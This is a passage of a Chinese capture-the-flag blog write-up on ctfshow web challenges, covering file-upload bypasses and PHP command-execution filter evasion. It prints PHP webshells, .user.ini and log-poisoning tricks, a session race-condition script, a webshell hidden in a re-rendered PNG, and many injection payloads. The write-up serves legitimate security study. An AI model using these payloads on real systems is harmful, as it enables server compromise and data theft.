<h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><p>是关于.user.ini的应用，实际上就是一个用户可以修改的配置文件，之前的一道CTF题里提及过该<a href="https://truthnian.github.io/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/">知识点</a>。</p>
<ol>
<li>上传<br>首先写好一个一句话木马，修改为c.png文件，直接上传<br>然后写好一个.user.ini文件，内容为：<br><code>auto_prepend_file=c.png</code><br>然后把该文件后缀改为png，抓包后再修改回ini<br>上传成功后，蚁剑连接：<br><code>http://46665bc5-3785-4b06-8c0a-4c3520c474bf.challenge.ctf.show/upload/</code><br>即可拿到flag</li>
</ol>
<h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>本题检测了文件中的php字符串，一句话木马可以改为简写方式：<br><code>&lt;?=eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code><br>或者大小写绕过</p>
<p>和上一题方法一样<br>成功拿到flag</p>
<h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p>过滤了php，只能使用简写方式。</p>
<p>和上一题方法一样<br>成功拿到flag</p>
<h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>多次尝试发现是过滤了[]<br>于是我们将一句话木马改为：<br><code>&lt;?=eval($_REQUEST&#123;&#39;cmd&#39;&#125;);?&gt;</code><br>仍然需要上传.user.ini文件<br>成功拿到flag</p>
<h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>被过滤了的有 <code>php, [], ;</code><br>因此无法使用一句话木马，我们改为执行代码，使用system函数显示出所需的flag文件<br>仍然需要上传.user.ini文件<br>成功拿到flag</p>
<p>将文件内容修改为：<br><code>&lt;?=system(&#39;cat ../f*&#39;)?&gt;</code><br>然后上传，<br>仍然需要上传.user.ini文件<br>完毕后访问页面: <code>url/upload/index.php</code><br>查看源代码，最终拿到flag</p>
<h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p>仍然需要上传.user.ini文件<br>和上一题几乎一致，访问页面: <code>url/upload</code><br>查看源代码，最终拿到flag</p>
<h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><p>由于过滤了 <code>()</code><br>所以我们使用反引号(`)，由此代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`cat ../f*`?&gt;</span><br></pre></td></tr></table></figure>


<h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><p>Linux下：<br>nginx的默认日志地址为: <code>/var/log/nginx/access.log</code><br>apache的默认日志地址为: <code>/var/log/apache2/access.log</code></p>
<p>在这道题中，反引号和空格均被过滤，那么我们采用日志文件包含。<br>原理是将一句话木马写入ua中，然后ua的内容会传到日志文件，由于我们将日志文件包含了，那么就能显示一句话木马，也即可以连接蚁剑。<br>首先，日志文件默认格式为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_format access &#x27;$remote_addr – $remote_user [$time_local] &quot;$request&quot;&#x27; &#x27;$status $body_bytes_sent &quot;$http_referer&quot;&#x27; &#x27;&quot;$http_user_agent&quot; $http_x_forwarded_for&#x27;;</span><br></pre></td></tr></table></figure>
<p>于是我们可以写入文件内容如下:<br><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>同时抓包，修改ua为一句话木马。<br>最后通过蚁剑连接：<br><code>http://6514c240-517e-4eca-b889-2f61dacb8762.challenge.ctf.show/upload/</code><br>即可拿到flag</p>
<h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><p>这道题利用 <code>getimagesize()</code> 函数验证文件头，那么我们可以使用 <code>GIF89a</code> 绕过检测。<br>只需在上一题的基础上，在每个文件加上GIF89a即可。</p>
<h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><ol>
<li><p>分析<br>这一次过滤了 <code>. flag</code>因此无法再使用原来的方式绕过，那么我们可以使用SESSION文件包含+条件竞争方式获取flag<br>这里有两篇文章可以详细解释SESSION文件包含的原理：<br><a href="https://www.php.net/manual/zh/session.upload-progress.php">Session 上传进度</a><br><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含</a><br>简单说一下原理：<br>在php.ini有以下几个默认选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">//表示upload_progress的功能开始，当浏览器向服务器上传一个文件时，</span><br><span class="line">//php将会把这次文件上传的详细信息（如上传时间，进度等）存储在session中，可以发送一个POST请求终端来检查这个状态</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">//表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">//name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">//prefix+name将表示为session中的键名</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class="line">7. session.use_strict_mode=0</span><br><span class="line">//此时用户可以自定义Session ID.</span><br><span class="line">//比如：在Cookie里设置PHPSESSID=123,PHP将在服务器上创建一个文件: /tmp/sess_123</span><br><span class="line">//即使此时用户没有初始化Session，也会自动初始化Session,并产生一个prefix+name连接在一起的值。</span><br></pre></td></tr></table></figure>
<p>也就是说，Session文件里有flag，当用POST方式带有命令执行的数据访问页面时，Session文件里会包含有flag数据，因此我们可以尝试获取Session文件的数据来获取flag，但由于Session文件的数据很快会被php.ini中的 <code>session.upload_progress.cleanup = on</code> 清空，因此我们需要采取条件竞争的方式获取flag。</p>
</li>
<li><p>上传<br>首先上传.user.ini,内容是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=&quot;png&quot;</span><br></pre></td></tr></table></figure>
<p>然后上传png，内容是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_123&quot;?&gt;</span><br></pre></td></tr></table></figure>
<p>最后使用python写一个条件竞争的脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这段代码利用PHP Web应用程序中的竞争条件读取包含flag的文件。<br>设置了‘PHPSESSID’的cookies为’sess’的值为’123’<br>创建了两个线程: 一个重复发送POST请求到url1变量指定的URL，带有一个 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，设置为包含PHP命令注入有效负载 <code>（&lt;?php system(&quot;tac ../f*&quot;);?&gt;）</code> 的字符串，另一个则重复发送GET请求到url2变量指定的URL，检查响应文本的”flag”字符串。</p>
</li>
</ol>
<h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><p>与上一题相同</p>
<h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>图片上传后会对其重命名，并且需要上传真实的png图片。<br>一般的一句话木马图片上传后会对其二次渲染，导致图片内的木马消失。</p>
<p>图片二次渲染是指对已经存在的图片进行修改或重新绘制的过程。这可以包括调整图像的颜色，添加新元素，或者删除现有元素等。<br>二次渲染可以用来改变图片的外观，或者用来添加水印，或者用来删除不需要的元素。它也可以用来调整图像的尺寸，或者对图像进行格式转换等。<br>图像二次渲染可以使用许多不同的工具来实现，包括专业的图像编辑软件，如 Photoshop 或 GIMP，也可以使用编程语言和图像处理库，如 PHP GD 库。<br>在图像处理过程中，二次渲染可以使用许多不同的技术，如图像分析、图像滤镜、图像插值和图像变换等。</p>
<p>因此我们需要通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染。PHP代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;D:/temp/b2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 图片内木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码使用了 PHP GD 库来创建一张新图片，尺寸为32x32像素。然后它使用一个十六进制数组来循环，并使用红色、绿色和蓝色值来设置图像中的像素。最后将图像保存为”b2.png”，保存在temp目录中。<br>将该图片上传后，访问该图片地址，并且传入以下参数：<br>GET:<br><code>http://eef25c0f-86f4-4cc9-9269-c17440f534c2.challenge.ctf.show/download.php?image=88c1ceb8ad1b0be7870b26ce8f79acc7.png&amp;0=system</code><br>POST:<br><code>1=cat f*</code></p>
<p>这样便能拿到flag</p>
<h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><p>jpg的二次渲染，但我没成功，暂时搁置吧</p>
<h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>仍然失败，看来需要暂时做点别的换换心情了。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-命令执行</title>
    <url>/2023/01/16/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前进，前进，不能停下脚步！</p>
<span id="more"></span>
<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法很多，和没过滤差不多</p>
</li>
<li><p>构造payload<br>有很多种绕过方式，以下随意列举几种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac f*`;</span><br><span class="line">?c=system(&#x27;tac f*&#x27;);</span><br><span class="line">?c=echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法还是很多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac f*`;</span><br><span class="line">?c=echo `cat f*`;</span><br><span class="line">?c=echo `more f*`;</span><br><span class="line">?c=echo `less f*`;</span><br><span class="line">?c=echo `head -n 20 f*`;</span><br><span class="line">?c=echo `tail -n 20 f*`;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次对空格进行了过滤，那么可以代替空格的有：<br><code>&lt;  &lt;&gt;  %09(tab)  $IFS$9  $&#123;IFS&#125;</code></p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo(`tac%09f*`);    // 在这里能使用的只有%09</span><br><span class="line">?c=echo(`tac\$&#123;IFS&#125;f*`);    // 要记得加转义字符</span><br><span class="line">?c=echo(`tac\$IFS\$9f*`);</span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);   // 可以采用这种嵌套的方式绕过过滤</span><br><span class="line">?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
过滤了括号，所以要用不需要括号的函数：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123;</span><br><span class="line">print 123;</span><br><span class="line">die;</span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
过滤了分号（;），可以使用 <code>?&gt;</code> 代替</li>
</ol>
<p>使用php伪协议将include包含的文件在页面上显示出来</p>
<ol start="2">
<li>构造payload<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
页面显示base64编码的内容，解码可得flag</li>
</ol>
<p>或者也可以使用data伪协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=data:text/plain,&lt;?= `tac flag.php`;?&gt;</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
<h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多过滤了一个双引号，不用就行了</p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>data:</code> ，可以让用户来控制输入流，当它与包含函数(inlcude,require等)结合时，用户输入的data流会被当作php文件执行</p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure>
<p>也可以通过包含日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p>同时抓包修改User-Agent: <code>&lt;?php system(&#39;tac f*&#39;);?&gt;</code><br>成功拿到flag</p>
</li>
</ol>
<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>区别不大</p>
</li>
<li><p>构造payload<br>同上。<br>成功拿到flag</p>
</li>
</ol>
<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在文件包含函数后面加了.php，这下不能使用日志包含了。<br>但是仍然能用data协议，因为php的尖括号已经闭合了，所以后面加.php也没用</p>
</li>
<li><p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
